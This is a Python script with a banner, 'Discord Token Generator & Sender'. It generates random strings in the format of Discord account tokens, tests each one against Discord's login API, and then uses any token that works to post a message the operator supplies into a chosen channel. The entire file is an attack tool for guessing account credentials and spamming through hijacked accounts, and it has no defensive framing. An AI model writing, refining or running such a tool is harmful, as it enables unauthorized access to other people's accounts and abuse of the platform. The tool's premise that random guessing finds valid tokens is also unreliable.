import random
import string
import os
import requests
import time
import threading
import keyboard  # For real-time key press detection
import tkinter as tk  # For the live token viewer
from colorama import Fore, Style, init

# Initialize colorama for Windows support
init(autoreset=True)

# Stylish ASCII banner
BANNER = f"""{Fore.RED}
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
 ░▒▓█▓▒▒▓█▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░  
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
   ░▒▓██▓▒░  ░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Discord Token Generator & Sender by YOU
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# Display banner
os.system("cls" if os.name == "nt" else "clear")  # Clear console
print(BANNER)

# Ask for user input
server_id = input(f"{Fore.YELLOW}[?] Enter your {Fore.CYAN}server ID{Fore.YELLOW}: {Fore.GREEN}")
channel_id = input(f"{Fore.YELLOW}[?] Enter your {Fore.CYAN}channel ID{Fore.YELLOW}: {Fore.GREEN}")
num_messages = int(input(f"{Fore.YELLOW}[?] How many messages do you want to send? {Fore.GREEN}"))

# Global list for live token viewing
generated_tokens = []

# Create GUI window for live tokens
def create_token_window():
    root = tk.Tk()
    root.title("Live Token Generator")
    root.geometry("400x300")
    
    text_box = tk.Text(root, wrap="word", bg="black", fg="green", font=("Courier", 10))
    text_box.pack(expand=True, fill="both")
    
    def update_tokens():
        text_box.delete(1.0, tk.END)
        text_box.insert(tk.END, "\n".join(generated_tokens[-10:]))  # Show last 10 tokens
        root.after(1000, update_tokens)  # Refresh every second

    update_tokens()
    root.mainloop()

# Token generation function
def generate_token():
    return (
        random.choice(string.ascii_letters).upper() +
        random.choice(string.ascii_letters).upper() +
        random.choice(string.ascii_letters) +
        ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21)) + "." +
        random.choice(string.ascii_letters).upper() +
        ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5)) + "." +
        ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    )

# Token validation function
def validate_token(token):
    response = requests.get("https://discord.com/api/v6/auth/login", headers={"Authorization": token})
    return response.status_code == 200

# Function to generate tokens until enough valid ones are found
valid_tokens = []

def token_generator():
    global generated_tokens
    print(f"\n{Fore.CYAN}Generating and validating tokens... (Press 'S' to view live tokens)\n")
    time.sleep(1)

    while len(valid_tokens) < num_messages:
        new_token = generate_token()
        generated_tokens.append(new_token)  # Add to live viewer
        
        if validate_token(new_token):
            print(f"{Fore.GREEN}[✓] Valid token found: {Fore.WHITE}{new_token[:25]}...")  # Shortened for display
            valid_tokens.append(new_token)
        else:
            print(f"{Fore.RED}[✗] Invalid token generated. Retrying...")

# Start token generation in a separate thread
threading.Thread(target=token_generator, daemon=True).start()

# Wait for user to press 'S' to open the token viewer
keyboard.wait("s")
print(f"\n{Fore.YELLOW}[!] Opening live token viewer...\n")

# Start token viewer in a separate thread
threading.Thread(target=create_token_window, daemon=True).start()

# Wait for the generator to finish
while len(valid_tokens) < num_messages:
    time.sleep(1)

print(f"\n{Fore.YELLOW}[✓] Found {num_messages} valid tokens.\n")

# Ask if user wants to send messages
send_messages = input(f"\n{Fore.YELLOW}[?] Do you want to send messages? (y/n): {Fore.GREEN}").strip().lower()

if send_messages == "y":
    message = input(f"{Fore.YELLOW}[?] Enter the message you want to send: {Fore.GREEN}")

    headers_list = [{"Authorization": token, "Content-Type": "application/json"} for token in valid_tokens]
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

    print(f"\n{Fore.CYAN}Sending messages...\n")
    sent_count = 0
    for header in headers_list:
        data = {"content": message}
        response = requests.post(url, headers=header, json=data)

        if response.status_code == 200:
            print(f"{Fore.GREEN}[✓] Message sent successfully with token: {Fore.WHITE}{header['Authorization'][:20]}...")
            sent_count += 1
        else:
            print(f"{Fore.RED}[✗] Failed to send message with token: {Fore.WHITE}{header['Authorization'][:20]}... (Status {response.status_code})")

    print(f"\n{Fore.YELLOW}[✓] Finished sending {sent_count} messages.\n")
else:
    print(f"{Fore.RED}[-] Exiting without sending messages.\n")
